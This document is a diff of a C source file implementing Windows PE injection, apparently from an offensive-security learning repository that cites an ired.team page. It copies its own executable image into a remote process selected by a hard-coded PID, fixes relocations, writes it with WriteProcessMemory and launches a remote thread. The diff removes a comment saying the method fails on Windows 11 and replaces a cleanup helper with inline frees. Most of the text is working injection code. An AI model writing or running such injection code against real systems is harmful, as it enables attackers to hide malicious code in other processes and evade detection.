@@ -2,7 +2,6 @@
 * Title: PE Injection
 * Resources:
 *	- https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes#code
-* Status: In my experience, it does not work on Windows 11. The error does not occur but InjectEntryPoint does not work.
 */
 #include <Windows.h>
 #include <stdio.h>
@@ -10,16 +9,7 @@
 typedef struct BASE_RELOCATION_ENTRY {
 	USHORT Offset : 12;
 	USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
-
-VOID Cleanup(PVOID pLocalImage, HANDLE hProcess, PVOID pTargetImage) {
-	if (pLocalImage)
-		VirtualFree(pLocalImage, 0, MEM_RELEASE);
-	if (pTargetImage)
-		VirtualFreeEx(hProcess, pTargetImage, 0, MEM_RELEASE);
-	if (hProcess)
-		CloseHandle(hProcess);
-}
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
 
 DWORD InjectionEntryPoint() {
 	/*
@@ -33,7 +23,7 @@ DWORD InjectionEntryPoint() {
 }
 
 BOOL PeInjection() {
-	DWORD dwPid = 7256; // Change it with the target PID.
+	DWORD dwPid = 21216; // Change it with the target PID.
 
 	PVOID pImageBase = GetModuleHandle(NULL);
 	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
@@ -41,21 +31,20 @@ BOOL PeInjection() {
 
 	// Overwrite an allocated memory with the image base.
 	PVOID pLocalImage = VirtualAlloc(nullptr, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
-	if (!pLocalImage) {
-		Cleanup(pLocalImage, nullptr, nullptr);
-		return FALSE;
-	}
+	if (!pLocalImage) return FALSE;
+
 	memcpy(pLocalImage, pImageBase, pNtHeaders->OptionalHeader.SizeOfImage);
 
 	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, dwPid);
 	if (!hProcess) {
-		Cleanup(pLocalImage, hProcess, nullptr);
+		VirtualFree(pLocalImage, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
 	PVOID pTargetImage = VirtualAllocEx(hProcess, nullptr, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!pTargetImage) {
-		Cleanup(pLocalImage, hProcess, pTargetImage);
+		VirtualFree(pLocalImage, 0, MEM_RELEASE);
+		CloseHandle(hProcess);
 		return FALSE;
 	}
 
@@ -80,9 +69,11 @@ BOOL PeInjection() {
 		}
 		pRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocTable + pRelocTable->SizeOfBlock);
 	}
-	
+
 	if (!WriteProcessMemory(hProcess, pTargetImage, pLocalImage, pNtHeaders->OptionalHeader.SizeOfImage, nullptr)) {
-		Cleanup(pLocalImage, hProcess, pTargetImage);
+		VirtualFree(pLocalImage, 0, MEM_RELEASE);
+		VirtualFreeEx(hProcess, pTargetImage, 0, MEM_RELEASE);
+		CloseHandle(hProcess);
 		return FALSE;
 	}
 
@@ -96,7 +87,7 @@ BOOL PeInjection() {
 		nullptr
 	);
 
-	Cleanup(pLocalImage, hProcess, pTargetImage);
+	CloseHandle(hProcess);
 
 	return TRUE;
 }
